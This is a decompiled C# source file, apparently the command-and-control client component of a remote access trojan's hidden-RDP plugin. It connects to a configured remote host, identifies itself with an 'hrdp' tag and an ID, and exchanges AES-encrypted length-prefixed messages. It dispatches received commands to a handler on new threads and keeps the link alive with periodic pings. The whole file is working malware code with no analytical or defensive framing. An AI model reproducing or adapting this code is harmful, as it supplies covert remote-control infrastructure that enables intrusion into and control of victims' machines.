using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Plugin
{
	// Token: 0x0200000A RID: 10
	public class ClientSocket
	{
		// Token: 0x06000017 RID: 23 RVA: 0x000022D4 File Offset: 0x000004D4
		public static void BeginConnect()
		{
			ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			ClientSocket.BufferLength = -1L;
			ClientSocket.Buffer = new byte[1];
			ClientSocket.MS = new MemoryStream();
			ClientSocket.S.ReceiveBufferSize = 51200;
			ClientSocket.S.SendBufferSize = 51200;
			try
			{
				ClientSocket.S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
				ClientSocket.isConnected = true;
				ClientSocket.Send("hrdp" + Settings.SPL + Settings.IDD);
				ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000023B8 File Offset: 0x000005B8
		public static void BeginReceive(IAsyncResult ar)
		{
			bool flag = !ClientSocket.isConnected;
			if (flag)
			{
				ClientSocket.isDisconnected();
			}
			checked
			{
				try
				{
					int num = ClientSocket.S.EndReceive(ar);
					bool flag2 = num > 0;
					if (flag2)
					{
						bool flag3 = ClientSocket.BufferLength == -1L;
						if (flag3)
						{
							bool flag4 = ClientSocket.Buffer[0] == 0;
							if (flag4)
							{
								ClientSocket.BufferLength = Conversions.ToLong(Helper.BS(ClientSocket.MS.ToArray()));
								ClientSocket.MS.Dispose();
								ClientSocket.MS = new MemoryStream();
								bool flag5 = ClientSocket.BufferLength == 0L;
								if (flag5)
								{
									ClientSocket.BufferLength = -1L;
									ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
									return;
								}
								ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - 1L) + 1];
							}
							else
							{
								ClientSocket.MS.WriteByte(ClientSocket.Buffer[0]);
							}
						}
						else
						{
							ClientSocket.MS.Write(ClientSocket.Buffer, 0, num);
							bool flag6 = ClientSocket.MS.Length == ClientSocket.BufferLength;
							if (flag6)
							{
								Thread thread = new Thread((ClientSocket._Closure$__.$IR8-1 == null) ? (ClientSocket._Closure$__.$IR8-1 = delegate(object a0)
								{
									ClientSocket.BeginRead((byte[])a0);
								}) : ClientSocket._Closure$__.$IR8-1);
								thread.Start(ClientSocket.MS.ToArray());
								ClientSocket.BufferLength = -1L;
								ClientSocket.MS.Dispose();
								ClientSocket.MS = new MemoryStream();
								ClientSocket.Buffer = new byte[1];
							}
							else
							{
								ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - ClientSocket.MS.Length - 1L) + 1];
							}
						}
						ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
					}
					else
					{
						ClientSocket.isDisconnected();
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isDisconnected();
				}
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000025DC File Offset: 0x000007DC
		public static void BeginRead(byte[] b)
		{
			try
			{
				Messages.Read(b);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002620 File Offset: 0x00000820
		public static void Send(string msg)
		{
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(array, 0, array.Length);
					ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
					ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				}
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000026DC File Offset: 0x000008DC
		public static void isDisconnected()
		{
			ClientSocket.isConnected = false;
			try
			{
				ClientSocket.S.Close();
				ClientSocket.S.Dispose();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			try
			{
				ClientSocket.MS.Close();
				ClientSocket.MS.Dispose();
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
			try
			{
				bool flag = Helper.MyProcess != null;
				if (flag)
				{
					Helper.MyProcess.Kill();
				}
			}
			catch (Exception ex3)
			{
				Debug.WriteLine(ex3.Message);
			}
			try
			{
				Plugin.T1.Abort();
			}
			catch (Exception ex4)
			{
				Debug.WriteLine(ex4.Message);
			}
			try
			{
				Plugin.T2.Abort();
			}
			catch (Exception ex5)
			{
				Debug.WriteLine(ex5.Message);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000282C File Offset: 0x00000A2C
		public static void Ping()
		{
			for (;;)
			{
				Thread.Sleep(30000);
				try
				{
					bool connected = ClientSocket.S.Connected;
					if (connected)
					{
						using (MemoryStream memoryStream = new MemoryStream())
						{
							byte[] array = Helper.AES_Encryptor(Helper.SB("PING?"));
							byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
							memoryStream.Write(array2, 0, array2.Length);
							memoryStream.Write(array, 0, array.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
							GC.Collect();
						}
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isDisconnected();
				}
			}
		}

		// Token: 0x0400000F RID: 15
		public static bool isConnected = false;

		// Token: 0x04000010 RID: 16
		public static Socket S;

		// Token: 0x04000011 RID: 17
		public static long BufferLength = 0L;

		// Token: 0x04000012 RID: 18
		public static byte[] Buffer;

		// Token: 0x04000013 RID: 19
		public static MemoryStream MS = new MemoryStream();
	}
}
